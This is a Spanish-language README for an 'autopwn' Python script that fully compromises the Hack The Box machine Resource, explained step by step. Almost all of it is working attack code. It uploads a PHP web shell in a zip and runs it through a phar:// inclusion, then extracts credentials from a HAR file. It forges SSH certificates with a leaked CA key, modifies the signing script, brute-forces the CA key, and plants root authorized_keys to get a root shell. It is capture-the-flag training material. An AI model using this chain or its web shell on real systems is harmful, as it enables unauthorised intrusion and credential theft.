# Autopwn - Resource

En caso de no haber realizado la máquina Resource, es recomendable revisar el [writeup](https://mrpr1ngl3s.github.io/htb/Resource) para comprender el autopwn.

<p align="center">
    <img src="Img/Autopwn-Resource.png"
        alt="autopwn"
    style="float: left; margin-right: 10px;" />
</p>

# Funcionamiento

Lo primero que se realiza es el registro y el login del usuario, utilizando **session** para poder tener una sesión persistente y utilizarlo mas adelante

```python3
s = requests.session()
```
```python3
def register():
	register = {
		'user': username,
		'pass': password,
		'pass2': password
	}

	r = requests.post(url_register, data=register)

def login(username, password):
	login = {
		'user': username,
		'pass': password
	}

	r = s.post(url_login, data=login)

register()
login(username,password)


```
Seguidamente, ejecuta las funciones **makezip** para crear el archivo **.zip** con el  **.php** dentro, y con la función **upload_zip** sube el comprimido.

```python3
def makezip():
	content = "<?php\n\tsystem($_GET['cmd']);\n?>"

	with open("test.php", "w") as file:
		file.write(content)

	zip_name = "test.zip"

	with ZipFile(zip_name, 'w') as zip:
		zip.write("test.php")


def upload_zip():
	data = {"subject": "red",
		"body": "red"
	}

	file_zip = {
		'attachment': ("test.zip",open('test.zip', 'rb'),'application/zip')
	}

	r = s.post(url_uploadf,data=data, files=file_zip)

makezip()
upload_zip()
```
Con el comprimido ya subido, ejecuta la función **get_tickit**, obtieniendo el **ID** del ticket mediante expresiones regulares. Luego, con la función **get_zip**, accede a la **URL** con el ID previamente obtenido para conseguir el nombre del comprimido, nuevamente utilizando expresiones regulares.

```python3
def get_tickid():
	r = s.get(url_tickid)

	tick_id = re.findall("<div class='col-2 center-text'>(.*?)</div>",r.text)[0]

	return tick_id

def get_zip(tick_id):
	url_zip = main_url + f"/?page=ticket&id={tick_id}"

	r = s.get(url_zip)

	zip_file = re.findall("href=\"../(.*?)\"><img src=\"/assets/img/zip-icon.png",r.text)[0]

	return zip_file

tick_id = get_tickid()
zip_file = get_zip(tick_id)
```

Con el nombre del comprimido ya conseguido, en la función **get_cred** consigue las credenciales necesarias para luego, en la función **make_cert**  crear la clave privada del usuario **zzinter** del contenedor

```python3
def get_cred(zip_file):
	# Busca el archivo .zip con mas peso, para luego descomprimirlo
	unzip_cred = "unzip -o $(find ./uploads -type f -size +1M -name \"*.zip\")"
	
	url_unzipcred = main_url + "?page=phar://" + zip_file + "/test&cmd=" + quote(unzip_cred)
	
	r = s.get(url_unzipcred)

	# Añade como delimitador los signos '=&"' y pilla los valores de las comunas 5 y 7 que serian el nombre de usuario y la contraseña
	get_cred = "cat itrc.ssg.htb.har | grep \"&pass\" | awk -F '[=&\"]' '{print \"Username: \"$5,\"Password: \" $7}' > credentials && cat credentials"

	url_getcred = main_url + "?page=phar://" + zip_file + "/test&cmd=" + quote(get_cred)

	r = s.get(url_getcred)
	# Consigue el nombre y la contraseña mediante expresiones regulares
	username = re.findall('Username: (.*?) ',r.text)[0]

	password = re.findall('Password: (.*?)\n',r.text)[0]

	return username, password

def make_cert(username, password):

	client = paramiko.SSHClient()

	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	# Accede con las credenciales obtenidas del usuario
	client.connect('10.10.11.27', username=username, password=password)
	# Crea la clave privada y publica del usuario
	client.exec_command('ssh-keygen -f ~/.ssh/id_rsa -N ""')

	time.sleep(2)
	# Genera la certificación con la clave privada de la entidad certificador (CA) a nombre del usuario zzinter
	client.exec_command('ssh-keygen -s ~/decommission_old_ca/ca-itrc -I 1 -n zzinter .ssh/id_rsa.pub')
	# Mediante la conexión via SSH al usuario zzinter indicando el certificado y nuestra clave privada, ejecutamos
	# direcamente el comando para crear la clave privada y publica, para luego crear el archivo 
	# authorized_keys y así conectarnos luego utilizando la clave privada y poder operar de forma mas comoda.
	client.exec_command('ssh -o StrictHostKeyChecking=no -o CertificateFile=~/.ssh/id_rsa-cert.pub -i ~/.ssh/id_rsa zzinter@127.0.0.1 rm -r .ssh\; mkdir .ssh\; ssh-keygen -f .ssh/id_rsa -N \\"\\"\; cp .ssh/id_rsa.pub .ssh/authorized_keys')

	time.sleep(4)
	# Mostramos el contenido de la clave privada del usuario zzinter
	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no -o CertificateFile=~/.ssh/id_rsa-cert.pub -i ~/.ssh/id_rsa zzinter@127.0.0.1 cat .ssh/id_rsa')
	# Para luego guardarlo
	priv_key = stdout.read().decode('utf-8')
	# Y añadir el contenido a un nuevo archivo con nombre 'id_rsa'
	with open('id_rsa', 'w') as f:
		f.write(priv_key)
	
	os.system('chmod 600 id_rsa')
	# Cerramos la conexión
	client.close()

username,password = get_cred(zip_file)
make_cert(username, password)
```
Con la clave privada creada, en la función **get_auth_principals** accede como el usuario **zzinter** y con la función **modify_file** modifica el contenido del nuevo script, para luego subirlo y ejecutarlo creando el certificado a nombre del usuario zzinter
```python3
def modify_file(new_supported):

	file_path = "sign_key_api_new.sh"

	with open(file_path, "r") as file:
		lines = file.readlines()

	# Recorre el contenido linea por linea, enumerandolas
	for x,line in enumerate(lines):
		if line.startswith("supported_principals="): # Si la linea empieza por "supported_principals="
			start = line.find('"') + 1 # Busca la posición de la primera comilla
			end = line.rfind('"') # Busca la posición de la ultima comilla, empezando desde el final

			principals = line[start:end] # Guarda el contenido que hay entre las dos posiciones, es decir, entre las comillas ["]

			if "zzinter_temp" not in principals: # Si en el contenido NO se encuentra "zzinter_temp"
				principals += ",zzinter_temp" # Es añadido

			lines[x] = "supported_principals=\"%s\"\n" % principals # El contenido de la linea numero X es modificada

			break

def get_auth_principals():
	# Cargar la clave privada convertida
	priv_key = paramiko.RSAKey.from_private_key_file("id_rsa")

	# Configura el cliente SSH
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# Accede via SSH utilizando la clave privada previamente conseguida
	client.connect("10.10.11.27", username="zzinter", pkey=priv_key)

	time.sleep(1)
	# el output del comando ejecutado para crear el certificado es guardado en un archivo 
	client.exec_command('bash sign_key_api.sh .ssh/id_rsa.pub test support > cert')

	client.exec_command('chmod 600 cert .ssh/id_rsa')

	stdin, stdout, stderr = client.exec_command('cat sign_key_api.sh')
	# Se guarda el contenido del script que crea los certificados
	content = stdout.read().decode()
	# Para luego crear un mismo archivo en local con el mismo contenido
	with open("sign_key_api_new.sh", "w") as file:
		file.write(content)
	# Accede como el usuario support para poder conseguir el nombre del usuario zzinter y guardarlo
	stdin, stdout, stderr = client.exec_command('ssh -p 2222 -o StrictHostKeyChecking=no -o CertificateFile=cert -i .ssh/id_rsa support@172.223.0.1 cat /etc/ssh/auth_principals/zzinter')

	new_supported = stdout.read().decode()
	# Para luego añadirlo al nuevo archivo creado
	modify_file(new_supported)
	# Añade el nuevo archivo al directorio /tmp
	sftp_client = client.open_sftp()
	sftp_client.put("sign_key_api_new.sh","/tmp/sign_key_api.sh")

	os.remove("sign_key_api_new.sh")
	#Y ejecuta el nuevo certificado para el usuario zzinter, pero ahora con el nuevo script
	client.exec_command('bash /tmp/sign_key_api.sh .ssh/id_rsa.pub test zzinter_temp > cert_z')

	client.exec_command('chmod 600 cert_z')
	# Mediante la conexión via SSH directamente, crea el archivo 'authorized_keys'
	client.exec_command('ssh -p 2222 -o StrictHostKeyChecking=no -o CertificateFile=cert_z -i ~/.ssh/id_rsa zzinter@172.223.0.1 rm -r .ssh\; mkdir .ssh\; ssh-keygen -f .ssh/id_rsa -N \\"\\"\; cp .ssh/id_rsa.pub .ssh/authorized_keys')

	time.sleep(4)

	stdin, stdout, stderr = client.exec_command('ssh -p 2222 -o StrictHostKeyChecking=no -o CertificateFile=cert_z -i ~/.ssh/id_rsa zzinter@172.223.0.1 cat .ssh/id_rsa')
	# Guarda el contenido de la clave privada
	priv_key = stdout.read().decode('utf-8')
	# Crea la clave privada para el usuario zzinter
	with open("id_rsa_z", "w") as f:
		f.write(priv_key)

	client.close()

get_auth_principals()
```

En la función **get_cert**, accede como el usuario zzinter, no sin antes realizar el Local Port Forwarding, para luego subir el script que descubrira mediante fuerza bruta la clave privada de la entidad certificadora y así poder crear el certificado, que se utilizará para poder crear como el usuario root, el authorized_keys y conseguir el contenido del **id_rsa**.

```python3
def get_cert():
	# Realiza un Local Port Forwarding aprovechando la conexión por SSH, convirtiendo el puerto 2222
	# a nuestro puerto 8080
	os.system("ssh -i id_rsa zzinter@10.10.11.27 -L 8080:172.223.0.1:2222 -Nf")

	time.sleep(4)

	# Cargar la clave privada convertida
	priv_key = paramiko.RSAKey.from_private_key_file("id_rsa_z")

	# Configurar el cliente SSH
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	time.sleep(4)

	# Conectar al servidor por el puerto 8080
	client.connect("127.0.0.1", port=8080, username="zzinter", pkey=priv_key)
	# Sube el archivo para descubrir la clave privada por fuerza bruta
	sftp_client = client.open_sftp()
	sftp_client.put("bruteforce_key.sh","bruteforce_key.sh")

	client.exec_command('chmod +x bruteforce_key.sh')

	client.exec_command('./bruteforce_key.sh')

	p1.status("Obteniendo la clave privada mediante fuerza bruta")

	while True:

		stdin, stdout, stderr = client.exec_command('cat key_cert &>/dev/null && echo $?')

		key_cert = stdout.read().decode('utf-8').strip()

		if key_cert == "0":
			break

	p1.success("Clave privada descubierta")
	# Con la clave privada de la entidad certifadora ya descubierto, crea el certificado a nombre del usuario root
	# y accede con este para finalmente crear el archivo authorized_keys
	log.info("Obteniendo la clave privada del usuario root...")
	client.exec_command('chmod 600 key_cert && ssh-keygen -s key_cert -I 1 -n root_user .ssh/id_rsa.pub && ssh -p 2222 -o StrictHostKeyChecking=no -o CertificateFile=.ssh/id_rsa-cert.pub -i ~/.ssh/id_rsa root@localhost "rm -r .ssh; mkdir .ssh; ssh-keygen -t rsa -f .ssh/id_rsa -N \\"\\"; cp .ssh/id_rsa.pub .ssh/authorized_keys"')

	time.sleep(5)

	stdin, stdout, stderr = client.exec_command('ssh -p 2222 -o StrictHostKeyChecking=no -o CertificateFile=.ssh/id_rsa-cert.pub -i ~/.ssh/id_rsa root@localhost cat .ssh/id_rsa')
	# Guarda el contenido de la clave privada
	priv_key = stdout.read().decode('utf-8')
	# Crea la clave privada para el usuario root
	with open("id_rsa_root", "w") as f:
		f.write(priv_key)

	client.close()
get_cert()
```
Finalmente, con la clave privada ya conseguida, con la función **access_root**, aprovechando el tunel SSH, accede como el usuario root utilizando la clave privada, teniendo ya acceso total al equipo.

```python3
def access_root():
	
	ssh_command = f"ssh -o StrictHostKeyChecking=no root@127.0.0.1 -i id_rsa_root -p 8080"

	ssh_session = pexpect.spawn(ssh_command, timeout=10)

	ssh_session.interact()
access_root()
```
